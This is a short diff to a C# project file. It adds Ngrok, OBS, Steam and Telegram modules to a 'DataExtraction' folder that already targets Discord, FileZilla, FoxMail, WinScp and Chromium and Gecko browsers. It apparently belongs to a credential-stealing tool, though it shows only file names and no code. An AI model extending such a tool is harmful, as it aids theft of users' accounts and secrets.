@@ -69,6 +69,10 @@
     <Compile Include="DataExtraction\Applications\Discord.cs" />
     <Compile Include="DataExtraction\Applications\FileZilla.cs" />
     <Compile Include="DataExtraction\Applications\FoxMail.cs" />
+    <Compile Include="DataExtraction\Applications\Ngrok.cs" />
+    <Compile Include="DataExtraction\Applications\OBS.cs" />
+    <Compile Include="DataExtraction\Applications\Steam.cs" />
+    <Compile Include="DataExtraction\Applications\Telegram.cs" />
     <Compile Include="DataExtraction\Applications\WinScp.cs" />
     <Compile Include="DataExtraction\Browsers\Chromium.cs" />
     <Compile Include="DataExtraction\Browsers\Gecko.cs" />
